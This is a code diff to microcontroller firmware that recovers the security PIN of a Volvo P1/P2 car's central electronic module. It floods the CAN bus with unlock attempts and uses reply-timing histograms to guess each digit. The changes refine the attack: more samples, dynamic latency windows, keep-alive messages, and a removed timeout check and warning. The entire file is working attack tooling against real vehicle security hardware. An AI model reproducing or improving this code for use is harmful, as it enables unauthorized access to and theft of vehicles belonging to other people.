@@ -80,7 +80,7 @@
 #define PLATFORM_P2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */
 
 #define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
-#define SAMPLES        10   /* number of samples per sequence, more is better (up to 100) */
+#define SAMPLES        100   /* number of samples per sequence, more is better (up to 100) */
 #define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 
 /* end of tunable parameters */
@@ -115,8 +115,6 @@
 /* P2 platform settings: S80, V70, XC70, S60, XC90 */
 
 #define BUCKETS_PER_US        1                    /* how many buckets per microsecond do we store (1 means 1us resolution */
-#define CEM_REPLY_DELAY_US    (30*BUCKETS_PER_US)  /* minimum time in us for CEM to reply for PIN unlock command (approx) */
-#define CEM_REPLY_TIMEOUT_MS  2                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
 
 //const uint32_t shuffleOrder[] = { 3, 1, 5, 0, 2, 4 };
 const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
@@ -126,10 +124,6 @@ const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
 /* P1 platform settings: S40, V50, C30, C70 */
 
 #define BUCKETS_PER_US        4                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
-#define CEM_REPLY_DELAY_US    (200*BUCKETS_PER_US) /* minimum time in us for CEM to reply for PIN unlock command (approx) */
-#define CEM_REPLY_TIMEOUT_MS  2                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
-
-#define USE_ROLLING_AVERAGE                        /* use a rolling average latency for choosing measurements */ 
 
 /* P1 processes the key in order
    The order in flash is still shuffled though
@@ -143,8 +137,12 @@ const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
 #endif
 
 //#define  DUMP_BUCKETS                               /* dump all buckets for debugging */
-#define AVERAGE_DELTA_MIN     (-8*BUCKETS_PER_US)  /* buckets to look at before the rolling average */
-#define AVERAGE_DELTA_MAX     (8*BUCKETS_PER_US)  /* buckets to look at after the rolling average  */
+uint32_t cem_reply_min;
+uint32_t cem_reply_avg;
+uint32_t cem_reply_max;
+
+#define AVERAGE_DELTA_MIN     (-8 * BUCKETS_PER_US)  /* buckets to look at before the rolling average */
+#define AVERAGE_DELTA_MAX     (12 * BUCKETS_PER_US)  /* buckets to look at after the rolling average  */
 
 /* hardware defintions */
 
@@ -211,8 +209,6 @@ typedef enum {
 
 #define TSC ARM_DWT_CYCCNT
 
-#define CEM_REPLY_US (400 * BUCKETS_PER_US)
-
 #define printf Serial.printf
 
 /* CAN bus speeds to use */
@@ -225,8 +221,6 @@ typedef enum {
 #define CEM_ECU_ID      0x50    /* P1/P2 CEM uses ECU id 0x50 in the messages */
 
 #define PIN_LEN         6       /* a PIN has 6 bytes */
-
-uint32_t averageResponse = 0;
 
 /* measured latencies are stored for each of possible value of a single PIN digit */
 
@@ -476,7 +470,7 @@ uint32_t profileCemResponse (void)
   bool     verbose = false;
   uint32_t i;
 
-  averageResponse = 0;
+  cem_reply_avg = 0;
 
   /* start time in milliseconds */
 
@@ -488,7 +482,8 @@ uint32_t profileCemResponse (void)
 
     /* average calculation is more reliable using random PIN digits */
 
-    pin[0] = random (0, 255); 
+    for (int j = 0; j < PIN_LEN; j++)
+      pin[j] = binToBcd(random(0, 99));
 
     /* try and unlock the CEM with the random PIN */
 
@@ -496,7 +491,7 @@ uint32_t profileCemResponse (void)
 
     /* keep a running total of the average latency */
 
-    averageResponse += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
+    cem_reply_avg += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
   }
 
   /* end time in milliseconds */
@@ -505,13 +500,16 @@ uint32_t profileCemResponse (void)
 
   /* calculate the average latency for a single response */
 
-  averageResponse = averageResponse / 1000;
+  cem_reply_avg /= 1000;
+
+  cem_reply_min = cem_reply_avg / 2;
+  cem_reply_max = cem_reply_avg + cem_reply_min;
 
   /* number of PINs processed per second */
 
   rate = 1e6 / (end - start);
 
-  printf ("1000 pins in %u ms, %u pins/s, average response: %u us\n", (end - start), rate, averageResponse);
+  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
   return rate;
 }
 
@@ -560,16 +558,16 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
   uint32_t clk_rate = clockCyclesPerMicrosecond();
 
+  /* maximum time to collect our samples */
+
+  limit = millis () + 2;
+
   /* send the unlock request */
   canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
 
   /* clear current interrupt status */
 
   canInterruptReceived = false;
-
-  /* maximum time to collect our samples */
-
-  limit = millis () + CEM_REPLY_TIMEOUT_MS;
 
   /*
    * Sample the CAN bus and determine the longest time between bit transitions.
@@ -586,13 +584,11 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
    */
 
   for (sampleCount = 0, start = TSC;
-      (canInterruptReceived == false) && 
-      (millis () < limit) &&
-      (maxTime < CEM_REPLY_DELAY_US * clk_rate);) {
-
+      (canInterruptReceived == false) &&
+      (millis () < limit);) {
     /* if the line is high, the CAN bus is either idle or transmitting a bit */
 
-    if (digitalRead (CAN_L_PIN) == 1) {
+    if (digitalRead (CAN_L_PIN)) {
 
       /* count how many times we've seen the bus in a "1" state */
 
@@ -615,30 +611,9 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
       maxTime = end - start;
     }
 
-    /* wait for the current transmission to finish before sampling again */
-
-    while (digitalRead (CAN_L_PIN) == 0) {
-
-      /* abort if we've hit our timeout */
-
-      if (millis () >= limit) {
-        break;
-      }
-    }
-
     /* start of the next sample */
 
     start = TSC;
-  }
-
-  /* check for a timeout condition */
-
-  if (millis () >= limit) {
-    printf ("Timeout waiting for CEM reply!\n");
-
-    /* on a timeout, try and see if there is anything in the CAN Rx queue */
-
-    replyWait = false;
   }
 
   /* default reply is set to indicate a failure */
@@ -720,6 +695,9 @@ void progModeOn (void)
   /* broadcast a series of PROG mode requests */
 
   while (time > 0) {
+    if ((time % 1000) == 0)
+      k_line_keep_alive();
+
     canMsgSend (CAN_HS, 0xffffe, data, verbose);
     canMsgSend (CAN_LS, 0xffffe, data, verbose);
 
@@ -778,7 +756,8 @@ int seq_max (const void *a, const void *b)
 
 void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 {
-  uint32_t histogram[CEM_REPLY_US];
+  int len = sizeof(uint32_t) * BUCKETS_PER_US * (cem_reply_max - cem_reply_min);
+  uint32_t *histogram = (uint32_t *)malloc(len);
   uint32_t latency;
   uint32_t prod;
   uint32_t sum;
@@ -789,16 +768,12 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   int best = 0;
   uint32_t best_prod = 0;
 
-  /* we process three digits in this code */
-
-  assert (pos <= (PIN_LEN - 3));
-
   /* clear collected latencies */
 
   memset (sequence, 0, sizeof(sequence));
 
   printf("                   us: ");
-  for (i = averageResponse + AVERAGE_DELTA_MIN; i < averageResponse + AVERAGE_DELTA_MAX; i++)
+  for (i = cem_reply_avg + AVERAGE_DELTA_MIN; i < cem_reply_avg + AVERAGE_DELTA_MAX; i++)
     printf("%5d ", i);
   printf("\n");
 
@@ -831,7 +806,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* clear histogram data for the new PIN digit */
 
-    memset (histogram, 0, sizeof(histogram));
+    memset (histogram, 0, len);
 
     /* iterate over all possible values for the adjacent PIN digit */
 
@@ -847,7 +822,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* iterate the next PIN digit (third digit) */
 
-        pin[pos + 2] = binToBcd ((uint8_t)(j % 100));
+        pin[pos + 2] = binToBcd ((uint8_t)j);
 
         /* try and unlock and measure the latency */
 
@@ -857,10 +832,13 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         uint32_t idx = latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
 
-        if (idx >= CEM_REPLY_US) {
-          idx = CEM_REPLY_US - 1;
-        }
+        if (idx < cem_reply_min)
+          idx = cem_reply_min;
 
+        if (idx >= cem_reply_max)
+          idx = cem_reply_max - 1;
+
+        idx -= cem_reply_min;
         /* bump the count for this latency */
 
         histogram[idx]++;
@@ -879,32 +857,19 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* loop over the histogram values */
 
-    for (k = (averageResponse + AVERAGE_DELTA_MIN);
-         k < (averageResponse + AVERAGE_DELTA_MAX);
-         k++) {
-      /* verify limit in case parameters are wrong */
+    for (k = cem_reply_avg + AVERAGE_DELTA_MIN; k < cem_reply_avg + AVERAGE_DELTA_MAX; k++) {
+      int l = k - cem_reply_min;
+      printf ("% 5u ", histogram[l]);
 
-      if (k > CEM_REPLY_US) {
-        continue;
-      }
-
-      printf ("% 5u ", histogram[k]);
-
+if (k > cem_reply_avg + 2) {
       /* calculate weighted count and total of all entries */
-
-      if (k >= averageResponse) {
-        prod += histogram[k] * k;
-        sum  += histogram[k];
-      }
+      prod += histogram[l] * l;
+      sum  += histogram[l];
     }
-
+    }
     /* weighted average */
 
-#if defined(USE_ROLLING_AVERAGE)
-    prod = prod / sum; 
-#endif
-
-    printf (": % 10u. best 0x%02x is %s by %d\n", prod, binToBcd(best), best_prod - prod > 0 ? "greater" : "less", abs(best_prod - prod));
+    printf (": % 10u; best %02x is %s than %02x by %d\n", prod, binToBcd(best), ((int)best_prod - (int)prod) > 0 ? "greater" : "less", pin[pos], abs(best_prod - prod));
 
     if (best_prod < prod) {
       best_prod = prod;
@@ -918,11 +883,11 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
 
 #if defined(DUMP_BUCKETS)
-    printf ("Average latency: %u\n", averageResponse);
+    printf ("Average latency: %u\n", cem_reply_avg);
 
-    for (k=0; k < CEM_REPLY_US; k++) {
+    for (k = 0; k < cem_reply_max - cem_reply_min; k++) {
       if (histogram[k] != 0) {
-        printf ("%4u : %5u\n", k, histogram[k]);
+        printf ("%4u : %5u\n", k + cem_reply_min, histogram[k]);
       }
     }
 #endif
@@ -939,31 +904,15 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
     printf ("%u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
   }
 
-#if defined(USE_ROLLING_AVERAGE)
-  /* update the average latency for the next measurement */
-
-  averageResponse = sequence[0].latency;
-#endif
-
   /* choose the PIN value that has the highest latency */
 
   printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);
-
-  /* print a warning message if the top two are close, we might be wrong */
-
-#if defined(PLATFORM_P2)
-
-  if ((sequence[0].latency - sequence[1].latency) < clockCyclesPerMicrosecond ()) {
-    printf ("Warning: Selected candidate is very close to the next candidate!\n");
-    printf ("         Selection may be incorrect.\n");
-  }
-
-#endif
 
   /* set the digit in the overall PIN */
 
   pin[pos] = sequence[0].pinValue;
   pin[pos + 1] = 0;
+  free(histogram);
 }
 
 /*******************************************************************************
@@ -1271,7 +1220,6 @@ void setup (void)
   printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
 #endif
   printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
-  printf ("Minimum CEM Reply Time:  %uus\n", CEM_REPLY_DELAY_US);
 #if defined(PLATFORM_P1)
   printf ("Platform:                P1\n");
 #elif defined (PLATFORM_P2)
@@ -1300,7 +1248,6 @@ void setup (void)
 
 void loop (void)
 {
-  k_line_keep_alive();
   bool verbose = false;
 
   /* drain any pending messages */
